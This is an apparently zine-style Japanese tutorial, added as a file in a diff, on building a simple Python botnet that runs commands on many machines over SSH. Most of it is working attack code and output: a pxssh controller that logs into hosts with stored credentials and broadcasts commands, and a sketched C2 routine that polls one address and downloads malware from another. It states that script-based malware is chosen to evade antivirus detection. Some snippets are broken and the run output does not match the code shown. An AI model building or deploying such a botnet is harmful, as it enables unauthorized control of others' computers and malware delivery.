@@ -1,0 +1,362 @@
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第○章: Pythonで始める簡易ボットネット構築 ---
+
+著者：黒林檎
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) 最初に
+
+　今回はPythonベースのマルウェアについて触れてみたいなと思います。
+　もちろんですが、コマンド＆コントロールサーバへの接続や、キーボードおよびマウスイベントをフックとするキーロガーなどもPythonで作成することができます。
+　スクリプトベースで作成する主な理由はウイルス検出を避けるためです。一般にウイルスとしての検出率は低くなる傾向があるといわれています。
+
+　今回はSSHで命令を送る簡易ボットネットを作成します。
+　ボットネットというと凄い技術みたいな感じですね。簡単にまとめてしまうと複数台のパソコンをSSHで一気に操作するコントローラーの作成です。なので命令実行側はSSHが必須です。手軽に実行出来るので、拡張して遊んでみてください。
+
+
+■0x02.) Test環境構築
+
+・パソコンA（命令送るパソコン）
+命令送信はSSHを使用するためpxsshというモジュールを手に入れておいてください。
+http://pexpect.sourceforge.net/pxssh.html
+
+・仮想環境（Vmwareやvagrantなどでも可、命令実行役）
+	[ISO]
+	お好みのOSのISOで可
+	[boxファイル]
+	Ubuntu boxダウンロードリンク
+	https://cloud-images.ubuntu.com/vagrant/trusty/current/
+
+・パソコンB（必須では無い、命令実行役）
+
+　ここでvagrantで仮想環境を作成します。
+　vagrantをここで使用する主な目的は、環境を簡単に（好みの状態で）作成できるからです。こうしたことにこだわらなければ、VirtualBoxやVmwareなどといったvagrant以外の仮想環境を使用しても問題ありません。
+
+　前提として、先ほどのUbuntuのboxファイルをダウンロードして、任意のディレクトリにあることとします。
+
+-----
+$vagrant box add ubuntu00 [boxファイルへの絶対パス]
+----
+
+○vagrant up手順メモ
+
+-----
+r00tapple@ubuntu:~/ubuntu$ vagrant box add ubuntu /home/r00tapple/Downloads/trusty-server-cloudimg-i386-vagrant-disk1.box
+Downloading or copying the box...
+Extracting box...te: 205M/s, Estimated time remaining: --:--:--)
+Successfully added box 'ubuntu' with provider 'virtualbox'!
+
+r00tapple@ubuntu:~/ubuntu$ vagrant init
+A `Vagrantfile` has been placed in this directory. You are now
+ready to `vagrant up` your first virtual environment! Please read
+the comments in the Vagrantfile as well as documentation on
+`vagrantup.com` for more information on using Vagrant.
+r00tapple@ubuntu:~/ubuntu$ vagrant up
+Bringing machine 'default' up with 'virtualbox' provider...
+There are errors in the configuration of this machine. Please fix
+the following errors and try again:
+
+vm:
+* The box 'base' could not be found.
+-----
+
+　「vagrant box add」は成功しましたが、「vagrant up」には失敗しました。これはbaseなんて物は存在しないというエラーなのでvagrantfileを少し書き換える必要があります。
+　書き換える部分がvagrantfileにあるかだけ無駄足を踏まないように確認しましょう。
+
+○確認
+
+-----
+r00tapple@ubuntu:~/ubuntu$ strings Vagrantfile | grep base
+  config.vm.box = "base"
+  # the file base.pp in the manifests_path directory.
+-----
+
+-----
+config.vm.box = "base"
+-----
+
+を
+
+-----
+config.vm.box = "ubuntu00"
+-----
+
+に書き換えればvagrant upが成功します。
+
+-----
+r00tapple@ubuntu:~/ubuntu$ vagrant box list
+ubuntu (virtualbox)
+r00tapple@ubuntu:~/ubuntu$ vi Vagrantfile
+r00tapple@ubuntu:~/ubuntu$ vagrant up
+Bringing machine 'default' up with 'virtualbox' provider...
+[default] Importing base box 'ubuntu'...
+[default] Matching MAC address for NAT networking...
+[default] Setting the name of the VM...
+以下略
+-----
+
+　次にSSH接続するためにvagrantfileの設定を書き直します。
+
+-----
+r00tapple@ubuntu:~/ubuntu$ strings Vagrantfile | grep 192.168.
+#config.vm.network :private_network, ip: "192.168.33.10"
+-----
+
+　はい、config.vm.networkの先頭にある#でコメントアウトされているので#を消してください。
+　vagrantに好きなユーザーを作成してください。
+
+-----
+vagrant@vagrant$useradd
+vagrant@vagrant$adduser
+-----
+
+　好きなユーザーを作成し、パスワードなど設定しておいてください（後々使用します）。
+
+　この状態でSSH接続ができるかを確認してみます。
+
+○接続
+
+-----
+r00tapple@ubuntu:~/script/pybot$ ssh -l guest 192.168.33.10
+guest@192.168.33.10's password: 
+Welcome to Ubuntu 14.04.2 LTS (GNU/Linux 3.13.0-48-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+  System information as of Thu Mar 26 17:51:31 UTC 2015
+
+  System load:  0.01              Processes:           78
+  Usage of /:   2.7% of 39.34GB   Users logged in:     2
+  Memory usage: 16%               IP address for eth0: 10.0.2.15
+  Swap usage:   0%                IP address for eth1: 192.168.33.10
+
+  Graph this data and manage this system at:
+    https://landscape.canonical.com/
+
+  Get cloud support with Ubuntu Advantage Cloud Guest:
+    http://www.ubuntu.com/business/services/cloud
+
+0 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Thu Mar 26 17:51:33 2015 from 192.168.33.1
+guest@vagrant-ubuntu-trusty-32:~$
+-----
+
+　ここまでできればtest環境の作成は終了です。
+
+※ただ、設定によってはデフォルトではパスワード認証ができないようにしてある場合もあるのでお気を付けください。
+
+
+■0x03.) pxsshについて
+
+　pxsshはこれはログイン、ログアウトするためのメソッドを追加し、シェルを手に入れることができます。
+
+-----
+http://pexpect.sourceforge.net/pxssh.html
+ import pxssh
+    import getpass
+    try:            
+    	#接続設定                                                
+        s = pxssh.pxssh()
+        hostname = raw_input('hostname: ')
+        username = raw_input('username: ')
+        password = getpass.getpass('password: ')
+        s.login (hostname, username, password)
+
+        #uptimeコマンド
+        s.sendline ('uptime')  #コマンド実行
+        s.prompt()             #プロンプト
+        print s.before         #実行結果
+
+        #lsコマンド
+        s.sendline ('ls -l')
+        s.prompt()
+        print s.before
+
+        #dfコマンド
+        s.sendline ('df')
+        s.prompt()
+        print s.before
+
+        #ログアウトとエラー処理
+        s.logout()
+    except pxssh.ExceptionPxssh, e:
+        print "pxssh failed on login."
+        print str(e)
+-----
+
+　pxsshについての操作方法を学習したところでコントローラーの作成について触れたいと思います。
+
+
+■0x04.) Pythonコントローラーの作成
+
+-----
+import pxssh
+
+class Client:
+
+    def __init__(self, host, user, password):
+        self.host = host
+        self.user = user
+        self.password = password
+        self.session = self.connect()
+
+    def connect(self):
+        try:
+            sec = pxssh.pxssh()
+            sec.login(self.host, self.user, self.password)
+            return sec
+        except Exception, e:
+            print e
+            print '[-] Error Connect'
+
+    def send_command(self, cmd):
+        self.session.sendline(cmd)
+        self.session.prompt()
+        return self.session.before
+
+
+def botnetCommand(command):
+    for client in botNet:
+        output = client.send_command(command)
+        print '[*] Output from ' + client.host
+        print '[+] ' + output 
+
+
+def addClient(host, user, password):
+    client = Client(host, user, password)
+    clientlist.append(client)
+
+clientlist = []
+#addClient('127.0.0.1', 'r00tapple', 'toor')
+addClient('192.168.33.10', 'guest', 'toor')
+
+botnetCommand('uname -a')
+botnetCommand('ping  127.0.0.1')
+#botnetCommand('好きなコマンド')
+-----
+
+　やっている事は単純で、先ほどのpxsshの使い方と似た部分も多いですね。
+
+○pxsshについてから
+
+-----
+        s = pxssh.pxssh()
+        hostname = raw_input('hostname: ')
+        username = raw_input('username: ')
+        password = getpass.getpass('password: ')
+        s.login (hostname, username, password)
+-----
+
+　「def __init__(self, host, user, password):」を定義、接続先をclientlistに書いて、「connect(self):」で接続ですね。
+　「def send_command(self, cmd):」が先ほどの、#uptimeコマンドなどにあたります。
+　基本的に難しい部分がないと思います。
+
+　今回は配列でクライアントを定義していますが、CSV形式のデータを読み取る方法でも良いと思います。
+
+-----
+import csv
+	clientlist = "client.csv"
+	csvfile = open(filename)
+	reader = csv.reader(csvfile)
+	for row in csv.reader(csvfile):
+		for elem in row:
+			value = elem
+			addClient(value)
+-----
+
+　このように、CSVデータをからクライアントデータ（192.168.33.10', 'guest', 'toor'）をaddClientに投げます。
+
+　他にも拡張できそうな部分として、次が挙げられます。
+
+-----
+import urllib2
+#def access():
+	add = "アドレス"
+	try:
+		sub1 = urlopen("address1")
+		sub2 = sub1.read()
+		print code2
+		if int(code2) == 1:
+			sub3 = urlopen("address2")
+			sub4 = sub3.read()
+			return sub4
+		else:
+			return add
+	except:
+			return add
+			pass
+-----
+
+　命令部分の拡張として、C2サーバーの例としてaddress1からデータ（ここでいうと1）というデータをダウンロードした場合if文が実行され、address2にアクセスし、外部からマルウェアをダウンロードします。
+　1で無い場合（ここでは0が望ましい）はelseが実行されます。
+
+
+■0x05.) 実行
+
+　それではスクリプトを実行させてみます。
+
+-----
+r00tapple@ubuntu:~/script/pybot$ python pyBot.py
+[*] Output from 127.0.0.1
+[+] ping -c 3 www.google.com
+PING www.google.com (173.194.117.209) 56(84) bytes of data.
+64 bytes from nrt04s11-in-f17.1e100.net (173.194.117.209): icmp_seq=1 ttl=128 time=14.0 ms
+
+[*] Output from 192.168.33.10
+[+] ping -c 3 www.google.com
+PING www.google.com (173.194.117.209) 56(84) bytes of data.
+64 bytes from 173.194.117.209: icmp_seq=1 ttl=63 time=7527 ms
+64 bytes from 173.194.117.209: icmp_seq=2 ttl=63 time=6530 ms
+64 bytes from 173.194.117.209: icmp_seq=3 ttl=63 time=5531 ms
+
+--- www.google.com ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 1998ms
+rtt min/avg/max/mdev = 5531.118/6529.671/7527.775/815.137 ms, pipe 3
+
+[*] Output from 127.0.0.1
+[+] ping -c 3 www.google.com
+PING www.google.com (173.194.117.209) 56(84) bytes of data.
+64 bytes from nrt04s11-in-f17.1e100.net (173.194.117.209): icmp_seq=1 ttl=128 time=14.0 ms
+64 bytes from nrt04s11-in-f17.1e100.net (173.194.117.209): icmp_seq=2 ttl=128 time=14.3 ms
+64 bytes from 173.194.117.209: icmp_seq=3 ttl=128 time=13.9 ms
+
+--- www.google.com ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 15194ms
+rtt min/avg/max/mdev = 13.966/14.130/14.332/0.180 ms
+
+[*] Output from 192.168.33.10
+[+] ls
+...
+-----
+
+　拡張的にはwget使ってぐちゃぐちゃっていう感じとか面白いと思います。
+
+-----
+[*] Output from 192.168.33.10
+[+] pwd
+/home/guest
+
+[*] Output from 192.168.33.10
+[+] wget http://nmap.org/dist/nmap-5.61TEST5.tar.bz2
+--2015-03-26 22:04:41--  http://nmap.org/dist/nmap-5.61TEST5.tar.bz2
+Resolving nmap.org (nmap.org)... 
+173.255.243.189, 2600:3c01::f03c:91ff:fe70:d085
+Connecting to nmap.org (nmap.org)|173.255.243.189|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 21500913 (21M) [application/x-bzip2]
+Saving to: ‘nmap-5.61TEST5.tar.bz2’
+
+100%[====================================>] 21,500,913   149KB/s   in 92s    
+
+2015-03-26 15:09:43 (229 KB/s) - ‘nmap-5.61TEST5.tar.bz2’ saved [21500913/21500913]
+-----
+
+
